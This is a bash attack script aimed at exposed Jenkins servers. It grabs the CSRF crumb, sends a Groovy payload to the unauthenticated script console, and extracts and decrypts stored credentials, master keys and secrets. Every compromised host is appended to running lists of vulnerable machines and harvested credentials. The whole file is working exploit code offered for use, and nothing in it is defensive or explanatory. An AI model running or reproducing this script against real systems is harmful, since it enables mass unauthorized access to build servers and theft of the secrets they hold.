#!/bin/bash

host=$1

mkdir -p jenkins_data/${host}
cd jenkins_data/${host}

#"http://${host}:8080/crumbIssuer/api/json" \
curl -k -s -m 5 \
-H "Host: ${host}:8080" \
-H 'Accept: text/html' \
"http://${host}:8080/script" \
--output get-response.txt \
--dump-header headers.txt

#jenkins_crumb=$(cat get-response.txt | python -c 'import sys,json;j=json.load(sys.stdin);print j["crumbRequestField"] + "=" + j["crumb"]')

# if [ ! -z "$jenkins_crumb" ]
# then
# 	#Try to get the jenkins crumb the old fashioned way
jenkins_crumb=$(perl -lne 'BEGIN{undef $/} while (/<script>crumb.init((.*?))<\/script>/sg){print $1}' get-response.txt | cut -d "," -f 2 | sed 's/");//g' | sed 's/ "//g')
# fi

the_cookies=$(cat headers.txt | grep "Set-Cookie" | cut -d ":" -f 2)

echo Available cookie: ${the_cookies}

echo This is the Jenkins Crumb: ${jenkins_crumb}


function post_jenkins(){
	curl -d "${jenkins_crumb}" \
	--data-urlencode "script=$(<../../jenkins.groovy)" \
	"http://${host}:8080/scriptText" \
	--output post-response.txt
	output=$(cat post-response.txt | grep ":cmd1:")
}

function gather_data(){
	echo ${host} is vulnerable! Gathering data!

	perl -lne 'BEGIN{undef $/} while (/:cmd1:(.*?):cmd1:/sg){print $1}' post-response.txt > credentials.xml

	perl -lne 'BEGIN{undef $/} while (/:cmd2:(.*?):cmd2:/sg){print $1}' post-response.txt | tr -d "\t\n\r" > master.key

	perl -lne 'BEGIN{undef $/} while (/:cmd3:(.*?):cmd3:/sg){print $1}' post-response.txt | xxd -r > hudson.util.Secret
	echo ${host} >> ../../allcreds.txt
	ruby ../../decrypt_jenkins.rb master.key hudson.util.Secret credentials.xml >> ../../allcreds.txt
	echo ${host} >> ../../vulnerable.txt
}

if [[ ! -z "$jenkins_crumb" ]]
then
	post_jenkins
	#echo "${output}----"
	if [[ ! -z "$output" ]]
	then 
		gather_data
	else
		echo "$host needs to be manually exploited (Jenkins crumb is available so script path is usable just CSRF proctection is enabled)".
		echo "Run the \"disable_jenkins_crumb.groovy\" script on the target machine"
		echo ${host} >> ../../manual.txt
	fi
else
	post_jenkins
	#echo "${output}----"
	if [[ ! -z "$output" ]]
	then 
		gather_data
	else
		echo "$host is not vulnerable. Continue on."
		echo ${host} >> ../../not-vulnerable.txt
	fi
fi

echo -e "$0 script finished\n\n"
